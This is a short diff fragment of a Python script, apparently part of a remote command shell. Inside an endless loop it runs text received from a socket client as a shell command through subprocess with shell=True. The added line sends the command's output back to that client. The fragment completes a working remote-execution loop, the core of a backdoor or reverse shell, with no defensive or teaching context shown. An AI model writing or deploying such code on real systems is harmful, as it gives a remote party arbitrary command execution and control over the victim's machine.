@@ -23,6 +23,7 @@ while 1:
         else:
             proc = subprocess.Popen(data.decode(), shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
             output = proc.stdout.read() + proc.stderr.read()
+            cli.send(output)
 
 
             # cli.send(output)
